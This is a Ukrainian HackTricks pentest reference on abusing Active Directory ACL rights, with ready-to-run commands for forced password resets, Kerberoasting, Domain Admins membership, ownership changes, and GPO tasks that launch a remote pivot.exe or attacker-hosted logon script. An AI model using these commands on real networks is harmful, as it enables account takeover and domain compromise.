# Зловживання ACLs/ACEs Active Directory

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub.**

</details>

**Ця сторінка в основному є підсумком технік з** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **та** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Для отримання додаткових відомостей перевірте оригінальні статті.**

## **Загальні права GenericAll на користувача**

Ця привілегія надає зловмиснику повний контроль над обліковим записом цільового користувача. Після підтвердження прав `GenericAll` за допомогою команди `Get-ObjectAcl`, зловмисник може:

* **Змінити пароль цільового користувача**: Використовуючи `net user <username> <password> /domain`, зловмисник може скинути пароль користувача.
* **Цільовий Kerberoasting**: Призначте SPN обліковому запису користувача для зроблення його kerberoastable, а потім використовуйте Rubeus та targetedKerberoast.py для видобутку та спроби розшифрування хешів квитків для надання доступу (TGT).
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
* **Цілеспрямоване ASREPRoasting**: Вимкніть попередню аутентифікацію для користувача, зробивши їх обліковий запис вразливим до ASREPRoasting.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Загальні права на групу GenericAll**

Ця привілея дозволяє зловмиснику маніпулювати членством у групі, якщо він має права `GenericAll` на групу, наприклад, `Domain Admins`. Після ідентифікації диференційованого імені групи за допомогою `Get-NetGroup`, зловмисник може:

* **Додати себе до групи адміністраторів домену**: Це можна зробити за допомогою прямих команд або використовуючи модулі, такі як Active Directory або PowerSploit.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**

Володіння цими привілеями на об'єкті комп'ютера або обліковому записі користувача дозволяє:

* **Обмеження делегування ресурсів Kerberos**: Дозволяє захопити об'єкт комп'ютера.
* **Тіньові облікові дані**: Використовуйте цю техніку для імітації облікового запису комп'ютера або користувача, експлуатуючи привілеї для створення тіньових облікових даних.

## **WriteProperty on Group**

Якщо у користувача є права `WriteProperty` на всі об'єкти для певної групи (наприклад, `Адміністратори домену`), вони можуть:

* **Додати себе до групи Адміністраторів домену**: Це можливо завдяки поєднанню команд `net user` та `Add-NetGroupUser`, цей метод дозволяє підвищення привілеїв в межах домену.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Сам (Само-членство) в групі**

Ця привілея дозволяє зловмисникам додавати себе до конкретних груп, таких як `Domain Admins`, за допомогою команд, які безпосередньо маніпулюють членством в групі. Використання наступної послідовності команд дозволяє самовіднесення:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Самочленство)**

Аналогічна привілея, яка дозволяє зловмисникам безпосередньо додавати себе до груп, змінюючи властивості груп, якщо вони мають право `WriteProperty` на ці групи. Підтвердження та виконання цієї привілеї виконуються за допомогою:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Утримання `ExtendedRight` на користувача для `User-Force-Change-Password` дозволяє скидати пароль без знання поточного пароля. Перевірку цього права та його експлуатацію можна виконати за допомогою PowerShell або альтернативних інструментів командного рядка, що пропонують кілька методів скидання пароля користувача, включаючи інтерактивні сесії та однорядкові команди для неінтерактивних середовищ. Команди варіюються від простих викликів PowerShell до використання `rpcclient` на Linux, демонструючи універсальність векторів атак.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner на групу**

Якщо зловмисник виявляє, що він має права `WriteOwner` на групу, він може змінити власника групи на себе. Це особливо важливо, коли обговорюється група `Domain Admins`, оскільки зміна власності дозволяє отримати більший контроль над атрибутами групи та її членством. Процес включає виявлення правильного об'єкта за допомогою `Get-ObjectAcl`, а потім використання `Set-DomainObjectOwner` для зміни власника, або за SID, або за ім'ям.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite на користувача**

Ця дозвіл дозволяє зловмиснику змінювати властивості користувача. Зокрема, з доступом `GenericWrite` зловмисник може змінити шлях до входу користувача для виконання зловмисного скрипту при вході користувача. Це досягається за допомогою команди `Set-ADObject` для оновлення властивості `scriptpath` цільового користувача, щоб вказати на скрипт зловмисника.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite на групі**

З цими привілеями зловмисники можуть маніпулювати членством у групі, додавати себе або інших користувачів до конкретних груп. Цей процес включає створення об'єкта облікових даних, використання його для додавання або видалення користувачів з групи та перевірку змін у членстві за допомогою команд PowerShell.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Володіння об'єктом AD та наявність привілеїв `WriteDACL` на ньому дозволяє зловмиснику надати собі привілеї `GenericAll` для об'єкта. Це досягається за допомогою маніпулювання ADSI, що дозволяє повний контроль над об'єктом та можливість змінювати його членство в групах. Незважаючи на це, існують обмеження при спробі використання цих привілеїв за допомогою командлетів `Set-Acl` / `Get-Acl` модуля Active Directory.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Реплікація в домені (DCSync)**

Атака DCSync використовує конкретні дозволи на реплікацію в домені для імітації контролера домену та синхронізації даних, включаючи облікові дані користувачів. Ця потужна техніка вимагає дозволів, таких як `DS-Replication-Get-Changes`, що дозволяє зловмисникам видобувати чутливу інформацію з середовища AD без прямого доступу до контролера домену. [**Дізнайтеся більше про атаку DCSync тут.**](../dcsync.md)

## Делегування GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Делегування GPO

Доступ, делегований для управління об'єктами групової політики (GPO), може створювати значні ризики безпеки. Наприклад, якщо користувач, такий як `offense\spotless`, має делеговані права управління GPO, вони можуть мати привілеї, такі як **WriteProperty**, **WriteDacl** та **WriteOwner**. Ці дозволи можуть бути зловживані для зловмисницьких цілей, як виявлено за допомогою PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Вибірка дозволів GPO

Для виявлення неправильно налаштованих GPO можна ланцюжити команди cmdlets PowerSploit. Це дозволяє виявити GPO, якими конкретний користувач має право управляти: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Комп'ютери з застосованою певною політикою**: Можливо визначити, на які комп'ютери застосовується певна GPO, що допомагає зрозуміти обсяг потенційного впливу. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Політики, застосовані до певного комп'ютера**: Щоб побачити, які політики застосовані до певного комп'ютера, можна використовувати команди, наприклад, `Get-DomainGPO`.

**Організаційні одиниці з застосованою політикою**: Визначення організаційних одиниць (OU), які постраждали від певної політики, можна здійснити за допомогою `Get-DomainOU`.

### Зловживання GPO - New-GPOImmediateTask

Неправильно налаштовані GPO можуть бути використані для виконання коду, наприклад, створення негайного запланованого завдання. Це може бути зроблено для додавання користувача до групи локальних адміністраторів на пошкоджених комп'ютерах, значно підвищуючи привілеї:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### Модуль GroupPolicy - Зловживання GPO

Модуль GroupPolicy, якщо він встановлений, дозволяє створювати та посилювати нові GPO та встановлювати налаштування, такі як значення реєстру для виконання задніх дверей на пошкоджених комп'ютерах. Цей метод вимагає оновлення GPO та входу користувача на комп'ютер для виконання:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Зловживання GPO

SharpGPOAbuse пропонує метод зловживання існуючими GPO шляхом додавання завдань або зміни налаштувань без необхідності створення нових GPO. Цей інструмент вимагає модифікації існуючих GPO або використання інструментів RSAT для створення нових перед застосуванням змін:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Примусове Оновлення Політики

Оновлення GPO зазвичай відбувається кожні 90 хвилин. Щоб прискорити цей процес, особливо після впровадження змін, можна використовувати команду `gpupdate /force` на цільовому комп'ютері для примусового оновлення політики. Ця команда гарантує, що будь-які модифікації GPO будуть застосовані без очікування наступного автоматичного циклу оновлення.

### Під Капотом

При огляді Запланованих завдань для певного GPO, наприклад, `Misconfigured Policy`, можна підтвердити додавання завдань, таких як `evilTask`. Ці завдання створюються за допомогою скриптів або інструментів командного рядка з метою модифікації поведінки системи або підвищення привілеїв.

Структура завдання, як показано в файлі конфігурації XML, створеному за допомогою `New-GPOImmediateTask`, наводить конкретику запланованого завдання - включаючи команду для виконання та його тригери. Цей файл відображає, як визначаються та керуються заплановані завдання в межах GPO, надаючи метод виконання довільних команд або скриптів як частини забезпечення політики.

### Користувачі та Групи

GPO також дозволяють маніпулювати членством користувачів та груп на цільових системах. Редагуючи файли політики Користувачів та Груп безпосередньо, зловмисники можуть додавати користувачів до привілейованих груп, таких як локальна група `administrators`. Це можливо завдяки делегуванню дозволів на керування GPO, що дозволяє модифікувати файли політики для включення нових користувачів або зміни членства в групах.

Файл конфігурації XML для Користувачів та Груп наводить, як ці зміни впроваджуються. Додавши записи до цього файлу, конкретним користувачам можуть бути надані підвищені привілеї на всіх зачеплених системах. Цей метод пропонує прямий підхід до підвищення привілеїв через маніпулювання GPO.

Крім того, можна розглядати додаткові методи виконання коду або збереження постійності, такі як використання скриптів входу/виходу, зміна ключів реєстру для автозапуску, встановлення програмного забезпечення через файли .msi або редагування конфігурацій служб. Ці техніки надають різноманітні можливості для збереження доступу та керування цільовими системами через зловживання GPO.

## Посилання

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github репозиторіїв.

</details>
